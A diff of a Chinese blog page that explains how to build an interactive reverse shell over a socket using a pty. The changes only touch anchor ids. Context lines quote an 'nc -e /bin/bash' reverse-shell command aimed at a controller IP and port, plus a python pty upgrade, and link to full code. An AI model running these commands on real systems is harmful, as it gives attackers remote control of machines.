@@ -53,17 +53,17 @@
         <ul>
           
           <li>
-            <a href="https://chenx6.github.io/post/rev-pty/#ke-jiao-hu-shell-de-yuan-li">“可交互 Shell” 的原理</a>
+            <a href="https://chenx6.github.io/post/rev_pty/#“可交互_Shell”_的原理">“可交互 Shell” 的原理</a>
             
           </li>
           
           <li>
-            <a href="https://chenx6.github.io/post/rev-pty/#dai-ma-shi-xian">代码实现</a>
+            <a href="https://chenx6.github.io/post/rev_pty/#代码实现">代码实现</a>
             
           </li>
           
           <li>
-            <a href="https://chenx6.github.io/post/rev-pty/#refs">Refs</a>
+            <a href="https://chenx6.github.io/post/rev_pty/#Refs">Refs</a>
             
           </li>
           
@@ -72,7 +72,7 @@
       
     </aside>
     <p>在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 <code>nc -e /bin/bash $控制机IP $控制机端口</code> 弹出一个 Shell，然后再用 <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。</p>
-<h2 id="ke-jiao-hu-shell-de-yuan-li">“可交互 Shell” 的原理</h2>
+<h2 id="“可交互_Shell”_的原理">“可交互 Shell” 的原理</h2>
 <p>现在常见的“终端模拟器”，例如 KDE 的 Konsole, MACos 上的 iterm，服务器上的 SSH，都是使用 &quot;pty&quot; 来实现的。而我们反弹的 Shell 则不一样，所以无法交互。</p>
 <p>而 pty 则是模拟终端的设备。平时使用的终端模拟器是和 pty master 进行沟通，而里面的 shell 是和 pty slave 进行沟通，两者通过 pty 进行沟通。</p>
 <pre data-lang="txt" class="language-txt z-code"><code class="language-txt" data-lang="txt"><span class="z-text z-plain">终端模拟器 &lt;=&gt; | pty master | pty | pty slave | &lt;=&gt; shell
@@ -80,7 +80,7 @@
 <p>所以我们的实现也很简单，通过 socket 将被控端的 master 和控制端连接起来就好了。</p>
 <pre data-lang="txt" class="language-txt z-code"><code class="language-txt" data-lang="txt"><span class="z-text z-plain">终端模拟器 &lt;=&gt; 控制端 &lt;=(socket 通信)=&gt; 被控端 &lt;=&gt; | pty master | pty | pty slave | &lt;=&gt; shell
 </span></code></pre>
-<h2 id="dai-ma-shi-xian">代码实现</h2>
+<h2 id="代码实现">代码实现</h2>
 <p>首先是导入相关文件，&quot;pty.h&quot; 包含 pty 相关函数的定义，而 &quot;select.h&quot; 则是用来处理异步通信的。</p>
 <pre data-lang="c" class="language-c z-code"><code class="language-c" data-lang="c"><span class="z-source z-c"><span class="z-meta z-preprocessor z-include z-c"><span class="z-keyword z-control z-import z-include z-c">#include</span> <span class="z-string z-quoted z-other z-lt-gt z-include z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&lt;</span>pty.h<span class="z-punctuation z-definition z-string z-end z-c">&gt;</span></span>
 </span><span class="z-meta z-preprocessor z-include z-c"><span class="z-keyword z-control z-import z-include z-c">#include</span> <span class="z-string z-quoted z-other z-lt-gt z-include z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&lt;</span>sys/select.h<span class="z-punctuation z-definition z-string z-end z-c">&gt;</span></span>
@@ -204,7 +204,7 @@ determine the terminal attributes and window size of the slave side of the pseud
 </span></code></pre>
 <p>可以看到，很少的代码就能创建一个交互式反弹 Shell，还能复习 UNIX 知识。</p>
 <p>完整代码在这：<a href="https://gist.github.com/chenx6/7a51c3cda5c0055a4df5cee66f762fea">https://gist.github.com/chenx6/7a51c3cda5c0055a4df5cee66f762fea</a></p>
-<h2 id="refs">Refs</h2>
+<h2 id="Refs">Refs</h2>
 <ul>
 <li>基于原本的项目，魔改了下，兼容 Python3 <a href="https://github.com/chenx6/python-pty-shells">https://github.com/chenx6/python-pty-shells</a></li>
 <li><a href="https://segmentfault.com/a/1190000019747315">pseudo-terminal 基础一</a></li>
